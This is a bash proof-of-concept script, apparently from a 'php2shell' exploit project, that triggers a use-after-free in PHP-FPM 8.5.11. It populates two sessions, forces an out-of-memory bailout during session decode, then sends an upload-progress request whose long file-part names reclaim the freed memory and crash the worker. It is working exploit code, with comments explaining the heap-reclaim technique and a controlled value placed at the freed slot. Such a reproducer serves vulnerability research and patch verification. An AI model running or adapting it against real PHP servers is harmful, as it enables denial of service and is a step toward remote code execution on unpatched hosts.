#!/usr/bin/env bash
# php2shell FPM stale-unserializer state -> worker SIGSEGV (PHP 8.5.11).
#
# usage: [RESTART=1] [CONTAINER=p2s-fpm] ./run_fpm_repro.sh [port]
#
# Requirements on the target:
#   - PHP 8.5.11 (or any pre-8.5.12 build where BG(unserialize) is reset only in
#     PHP_RINIT(basic), i.e. after php_hash_environment());
#   - PHP-FPM with one worker (pm.max_children=1);
#   - www/fpm_sess.php, www/fpm_sess_oom.php, www/index.php reachable;
#   - session.upload_progress.enabled=On (default), session.use_strict_mode=0.
#
# Steps: S1 = session whose record is a 1.19 MB serialized array; S2 = session
# whose record is one integer. A = session_start() with S1 under
# memory_limit=4M: the decode OOM bails out before var_destroy, leaving
# BG(unserialize).level=1 and a dangling php_unserialize_data plus its
# var_dtor_entries block. B = upload-progress multipart request against S2 whose
# 4096-byte file-part names reclaim the freed struct; the session decode runs
# before Basic's RINIT and dereferences the clobbered pointers in var_tmp_var.
set -euo pipefail

PORT=${1:-9001}
CONTAINER=${CONTAINER:-}
DIR=$(cd "$(dirname "$0")" && pwd)
TMP=$(mktemp -d)
trap 'rm -rf "$TMP"' EXIT

if [ "${RESTART:-0}" = 1 ] && [ -n "$CONTAINER" ]; then
    docker restart "$CONTAINER" >/dev/null
    sleep 1.5
fi

crashes() {
    [ -n "$CONTAINER" ] || { echo 0; return; }
    docker logs "$CONTAINER" 2>&1 | grep -c 'signal 11' || true
}

python3 "$DIR/mk_a_payload.py" --out "$TMP/a.bin" >/dev/null

echo "[1/4] S1: session record = 1.19 MB serialized array"
S1=$(curl -s -D - -o /dev/null -F "d=@$TMP/a.bin" "http://127.0.0.1:$PORT/fpm_sess.php" \
    | grep -o 'PHPSESSID=[a-f0-9]*' | cut -d= -f2)
[ -n "$S1" ] || { echo "S1 populate failed" >&2; exit 1; }

echo "[2/4] S2: session record = one integer (the value written at the slot)"
S2=$(curl -s -D - -o /dev/null --form-string 'd=i:4702111234474983745;' \
    "http://127.0.0.1:$PORT/fpm_sess.php" | grep -o 'PHPSESSID=[a-f0-9]*' | cut -d= -f2)
[ -n "$S2" ] || { echo "S2 populate failed" >&2; exit 1; }

BEFORE=$(crashes)

echo "[3/4] A: session_start() decode OOM (stale BG(unserialize))"
A=$(curl -s -o /dev/null -w '%{http_code}' -b "PHPSESSID=$S1" \
    "http://127.0.0.1:$PORT/fpm_sess_oom.php")
echo "      A http=$A (expect 500)"

echo "[4/4] B: upload-progress + 16 x 4096-byte file names"
python3 "$DIR/send_b.py" "$PORT" "$S2" FFFFFFFFFFFFFFFE 4096 16
sleep 0.5

AFTER=$(crashes)
echo "      signal-11 log entries: $BEFORE -> $AFTER"
if [ "$AFTER" -gt "$BEFORE" ]; then
    echo "RESULT: FPM worker SIGSEGV (stale unserialize state reused)"
    exit 0
fi

echo "RESULT: no SIGSEGV observed."
echo "On a vulnerable 8.5.11 worker the reclaim spray is heap-layout dependent:"
echo "restart the worker (RESTART=1 CONTAINER=<name>) and retry. Fixed builds"
echo "(8.5.12+) do not crash; A returns 200 instead of the OOM 500."
exit 1
